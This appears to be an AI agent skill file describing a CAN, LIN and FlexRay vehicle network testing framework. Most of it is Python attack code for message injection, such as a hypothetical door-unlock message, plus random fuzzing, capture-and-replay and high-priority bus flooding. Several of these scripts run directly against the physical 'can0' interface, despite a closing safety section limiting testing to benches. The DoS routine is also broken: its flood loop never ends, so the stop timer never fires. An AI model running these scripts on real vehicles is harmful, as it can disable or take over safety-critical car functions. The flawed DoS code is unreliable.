---
name: s800-vehicle-network-security-testing
description: Security testing framework for automotive vehicle networks (CAN, LIN, FlexRay) with fuzzing, injection, and monitoring capabilities
triggers:
  - test vehicle network security
  - run CAN bus security tests
  - fuzz automotive network protocols
  - inject CAN messages for testing
  - monitor vehicle network traffic
  - analyze automotive bus security
  - test car network vulnerabilities
  - perform vehicle penetration testing
---

# S800 Vehicle Network Security Testing Framework

> Skill by [ara.so](https://ara.so) — Security Skills collection.

## Overview

S800 is a comprehensive security testing framework designed for automotive vehicle networks including CAN (Controller Area Network), LIN (Local Interconnect Network), and FlexRay protocols. It provides tools for fuzzing, message injection, traffic monitoring, and vulnerability assessment of in-vehicle communication systems.

**Key Features:**
- CAN bus message injection and sniffing
- Protocol fuzzing for automotive networks
- Real-time traffic analysis and filtering
- Replay attack simulation
- DoS testing capabilities
- Network topology mapping
- Security assessment reporting

## Installation

### Prerequisites

```bash
# Required hardware adapters
# - CAN USB adapter (e.g., Kvaser, PEAK, SocketCAN compatible)
# - Linux kernel with SocketCAN support

# Install system dependencies (Debian/Ubuntu)
sudo apt-get update
sudo apt-get install can-utils python3 python3-pip git

# Load CAN kernel modules
sudo modprobe can
sudo modprobe can_raw
sudo modprobe vcan
```

### Setup

```bash
# Clone repository
git clone https://github.com/zhu-zhu666/S800-Vehicle-Network-Security-Testing-Framework.git
cd S800-Vehicle-Network-Security-Testing-Framework

# Install Python dependencies
pip3 install -r requirements.txt

# Configure CAN interface (replace can0 with your interface)
sudo ip link set can0 type can bitrate 500000
sudo ip link set can0 up

# Create virtual CAN for testing (optional)
sudo ip link add dev vcan0 type vcan
sudo ip link set vcan0 up
```

## Configuration

### Network Interface Configuration

```python
# config.py
CAN_INTERFACE = "can0"  # Physical CAN interface
VCAN_INTERFACE = "vcan0"  # Virtual CAN for testing
BITRATE = 500000  # 500 kbps standard automotive bitrate

# Testing parameters
FUZZ_ITERATIONS = 10000
INJECTION_DELAY = 0.01  # seconds between injections
LOG_DIRECTORY = "./logs"
CAPTURE_TIMEOUT = 60  # seconds

# Security test profiles
TEST_PROFILES = {
    "basic": {
        "fuzz_enabled": True,
        "dos_enabled": False,
        "replay_enabled": True
    },
    "aggressive": {
        "fuzz_enabled": True,
        "dos_enabled": True,
        "replay_enabled": True,
        "injection_rate": "high"
    }
}
```

## Core Features

### 1. CAN Message Sniffing

```python
#!/usr/bin/env python3
import can
import time

def sniff_can_traffic(interface="can0", duration=60):
    """Monitor CAN bus traffic and log messages"""
    
    bus = can.interface.Bus(channel=interface, bustype='socketcan')
    
    print(f"[*] Sniffing on {interface} for {duration} seconds...")
    start_time = time.time()
    message_count = 0
    
    try:
        while (time.time() - start_time) < duration:
            message = bus.recv(timeout=1.0)
            if message:
                message_count += 1
                print(f"ID: 0x{message.arbitration_id:03X} "
                      f"Data: {message.data.hex()} "
                      f"DLC: {message.dlc}")
                
                # Log to file
                with open("can_capture.log", "a") as f:
                    f.write(f"{time.time()},{message.arbitration_id:03X},"
                           f"{message.data.hex()}\n")
    
    except KeyboardInterrupt:
        print("\n[!] Capture interrupted")
    finally:
        bus.shutdown()
        print(f"[+] Captured {message_count} messages")

if __name__ == "__main__":
    sniff_can_traffic(interface="can0", duration=60)
```

### 2. CAN Message Injection

```python
#!/usr/bin/env python3
import can
import time

def inject_can_message(interface, arb_id, data, count=1, delay=0.1):
    """Inject custom CAN messages onto the bus"""
    
    bus = can.interface.Bus(channel=interface, bustype='socketcan')
    
    # Convert data to bytes if string
    if isinstance(data, str):
        data = bytes.fromhex(data)
    
    message = can.Message(
        arbitration_id=arb_id,
        data=data,
        is_extended_id=False
    )
    
    print(f"[*] Injecting message ID: 0x{arb_id:03X}")
    
    for i in range(count):
        try:
            bus.send(message)
            print(f"[+] Sent message {i+1}/{count}")
            time.sleep(delay)
        except can.CanError as e:
            print(f"[!] Error sending message: {e}")
    
    bus.shutdown()

# Example: Inject door unlock command (hypothetical)
inject_can_message(
    interface="can0",
    arb_id=0x2A0,
    data="0102030405060708",
    count=5,
    delay=0.1
)
```

### 3. Protocol Fuzzing

```python
#!/usr/bin/env python3
import can
import random
import time

def fuzz_can_messages(interface, target_ids=None, iterations=1000):
    """Fuzz CAN messages with random data"""
    
    bus = can.interface.Bus(channel=interface, bustype='socketcan')
    
    # Default to common OBD-II and diagnostic IDs if none specified
    if target_ids is None:
        target_ids = [0x7DF, 0x7E0, 0x7E8, 0x2A0, 0x3B0, 0x4C0]
    
    print(f"[*] Starting fuzzing campaign: {iterations} iterations")
    
    for i in range(iterations):
        # Randomize arbitration ID from target list
        arb_id = random.choice(target_ids)
        
        # Generate random data (1-8 bytes)
        data_length = random.randint(1, 8)
        data = bytes([random.randint(0, 255) for _ in range(data_length)])
        
        message = can.Message(
            arbitration_id=arb_id,
            data=data,
            is_extended_id=False
        )
        
        try:
            bus.send(message)
            
            if (i + 1) % 100 == 0:
                print(f"[*] Progress: {i+1}/{iterations} messages sent")
            
            # Log interesting responses
            response = bus.recv(timeout=0.01)
            if response:
                log_response(arb_id, data, response)
            
            time.sleep(0.01)  # Rate limiting
            
        except can.CanError as e:
            print(f"[!] Error at iteration {i}: {e}")
            continue
    
    bus.shutdown()
    print("[+] Fuzzing campaign completed")

def log_response(sent_id, sent_data, response):
    """Log fuzzing responses for analysis"""
    with open("fuzz_responses.log", "a") as f:
        f.write(f"{time.time()},0x{sent_id:03X},{sent_data.hex()},"
               f"0x{response.arbitration_id:03X},{response.data.hex()}\n")

# Execute fuzzing
fuzz_can_messages(interface="can0", iterations=5000)
```

### 4. Replay Attack Simulation

```python
#!/usr/bin/env python3
import can
import time
import csv

def capture_and_replay(interface, capture_duration=30, replay_count=1):
    """Capture CAN traffic and replay it"""
    
    bus = can.interface.Bus(channel=interface, bustype='socketcan')
    captured_messages = []
    
    # Phase 1: Capture
    print(f"[*] Capturing traffic for {capture_duration} seconds...")
    start_time = time.time()
    
    while (time.time() - start_time) < capture_duration:
        message = bus.recv(timeout=1.0)
        if message:
            captured_messages.append({
                'timestamp': time.time(),
                'id': message.arbitration_id,
                'data': message.data,
                'dlc': message.dlc
            })
    
    print(f"[+] Captured {len(captured_messages)} messages")
    
    # Phase 2: Replay
    print(f"[*] Replaying {replay_count} time(s)...")
    
    for replay in range(replay_count):
        print(f"[*] Replay iteration {replay + 1}/{replay_count}")
        
        for msg in captured_messages:
            replay_msg = can.Message(
                arbitration_id=msg['id'],
                data=msg['data'],
                is_extended_id=False
            )
            
            try:
                bus.send(replay_msg)
                time.sleep(0.001)  # Minimal delay
            except can.CanError as e:
                print(f"[!] Replay error: {e}")
    
    bus.shutdown()
    print("[+] Replay completed")
    
    # Save capture for later analysis
    save_capture(captured_messages, "replay_capture.csv")

def save_capture(messages, filename):
    """Save captured messages to CSV"""
    with open(filename, 'w', newline='') as f:
        writer = csv.writer(f)
        writer.writerow(['Timestamp', 'ID', 'Data', 'DLC'])
        for msg in messages:
            writer.writerow([
                msg['timestamp'],
                f"0x{msg['id']:03X}",
                msg['data'].hex(),
                msg['dlc']
            ])
    print(f"[+] Capture saved to {filename}")

# Execute replay attack
capture_and_replay(interface="can0", capture_duration=30, replay_count=3)
```

### 5. DoS Testing

```python
#!/usr/bin/env python3
import can
import time
import threading

def dos_attack(interface, attack_type="flood", duration=10):
    """Perform DoS attack on CAN bus"""
    
    bus = can.interface.Bus(channel=interface, bustype='socketcan')
    stop_flag = threading.Event()
    
    def flood_attack():
        """High-priority message flooding"""
        message = can.Message(
            arbitration_id=0x000,  # Highest priority
            data=[0xFF] * 8,
            is_extended_id=False
        )
        
        count = 0
        while not stop_flag.is_set():
            try:
                bus.send(message)
                count += 1
            except can.CanError:
                pass
        
        return count
    
    def collision_attack():
        """Create bus collisions"""
        count = 0
        while not stop_flag.is_set():
            # Send conflicting messages simultaneously
            for arb_id in [0x100, 0x200, 0x300]:
                msg = can.Message(
                    arbitration_id=arb_id,
                    data=[0xAA] * 8,
                    is_extended_id=False
                )
                try:
                    bus.send(msg, timeout=0)
                    count += 1
                except can.CanError:
                    pass
        
        return count
    
    print(f"[*] Starting {attack_type} DoS attack for {duration} seconds")
    print("[!] WARNING: This will disrupt normal bus operation")
    
    start_time = time.time()
    
    if attack_type == "flood":
        messages_sent = flood_attack()
    elif attack_type == "collision":
        messages_sent = collision_attack()
    
    # Run for specified duration
    time.sleep(duration)
    stop_flag.set()
    
    bus.shutdown()
    elapsed = time.time() - start_time
    print(f"[+] Attack completed: {messages_sent} messages in {elapsed:.2f}s")
    print(f"[+] Rate: {messages_sent/elapsed:.0f} messages/second")

# Example: Run flood attack
# dos_attack(interface="vcan0", attack_type="flood", duration=10)
```

## Common Patterns

### Security Assessment Workflow

```python
#!/usr/bin/env python3
import can
import time

class VehicleSecurityTester:
    def __init__(self, interface):
        self.interface = interface
        self.bus = can.interface.Bus(channel=interface, bustype='socketcan')
        self.results = {}
    
    def run_full_assessment(self):
        """Run comprehensive security assessment"""
        print("[*] Starting vehicle security assessment")
        
        self.results['discovery'] = self.discover_active_ids()
        self.results['baseline'] = self.establish_baseline()
        self.results['fuzzing'] = self.targeted_fuzz()
        self.results['replay'] = self.test_replay_vulnerability()
        
        self.generate_report()
    
    def discover_active_ids(self, duration=30):
        """Discover active CAN IDs on the bus"""
        print("[*] Phase 1: ID Discovery")
        active_ids = set()
        
        start_time = time.time()
        while (time.time() - start_time) < duration:
            msg = self.bus.recv(timeout=1.0)
            if msg:
                active_ids.add(msg.arbitration_id)
        
        print(f"[+] Discovered {len(active_ids)} active IDs")
        return list(active_ids)
    
    def establish_baseline(self):
        """Establish normal traffic baseline"""
        print("[*] Phase 2: Baseline Establishment")
        # Implementation here
        return {"status": "completed"}
    
    def targeted_fuzz(self):
        """Perform targeted fuzzing on discovered IDs"""
        print("[*] Phase 3: Targeted Fuzzing")
        # Implementation here
        return {"status": "completed"}
    
    def test_replay_vulnerability(self):
        """Test for replay attack vulnerabilities"""
        print("[*] Phase 4: Replay Testing")
        # Implementation here
        return {"status": "completed"}
    
    def generate_report(self):
        """Generate security assessment report"""
        print("\n[+] Security Assessment Report")
        print("=" * 50)
        for phase, result in self.results.items():
            print(f"{phase}: {result}")

# Run assessment
tester = VehicleSecurityTester(interface="can0")
tester.run_full_assessment()
```

## Troubleshooting

### Common Issues

**CAN interface not found:**
```bash
# Check available interfaces
ip link show

# Verify CAN modules loaded
lsmod | grep can

# Check dmesg for hardware issues
dmesg | grep can
```

**Permission denied:**
```bash
# Add user to dialout group
sudo usermod -a -G dialout $USER

# Or run with sudo (not recommended for production)
sudo python3 script.py
```

**Bus-off state:**
```python
# Reset CAN interface
import subprocess

def reset_can_interface(interface):
    subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'down'])
    subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'up'])
```

**High error rates:**
- Verify bitrate matches vehicle network (typically 500kbps or 250kbps)
- Check cable connections and termination resistors
- Ensure proper grounding

## Safety and Legal Considerations

**IMPORTANT:** 
- Only test on isolated test benches or virtual CAN networks
- Never test on operational vehicles without authorization
- Unauthorized vehicle network testing may be illegal
- Always follow responsible disclosure practices
- Improper testing can cause physical damage or safety hazards

## Environment Variables

```bash
# Set in your environment or .env file
export S800_CAN_INTERFACE="can0"
export S800_LOG_LEVEL="INFO"
export S800_OUTPUT_DIR="./test_results"
export S800_BITRATE="500000"
```

Use in code:
```python
import os

interface = os.getenv('S800_CAN_INTERFACE', 'can0')
log_level = os.getenv('S800_LOG_LEVEL', 'INFO')
output_dir = os.getenv('S800_OUTPUT_DIR', './logs')
```
